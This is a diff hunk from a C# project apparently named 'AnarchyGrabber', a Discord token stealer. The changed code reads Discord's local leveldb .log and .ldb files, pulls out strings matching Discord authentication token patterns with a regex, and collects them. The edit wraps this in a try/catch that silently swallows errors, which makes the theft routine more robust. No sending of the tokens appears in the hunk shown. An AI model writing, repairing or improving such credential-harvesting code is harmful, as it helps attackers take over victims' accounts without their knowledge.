@@ -18,13 +18,16 @@ namespace AnarchyGrabber
 
             List<string> tokens = new List<string>();
 
-
-            foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
+            try
             {
-                //looks for discord token patterns (yes my regex is shit shut up)
-                foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
-                    tokens.Add(match.Value);
+                foreach (var file in leveldb.GetFiles(checkLogs ? "*.log" : "*.ldb"))
+                {
+                    //looks for discord token patterns (yes my regex is shit shut up)
+                    foreach (Match match in Regex.Matches(file.OpenText().ReadToEnd(), @"[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-]\.[\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-][\w-]"))
+                        tokens.Add(match.Value);
+                }
             }
+            catch { }
 
             tokens = tokens.Distinct().ToList();
 
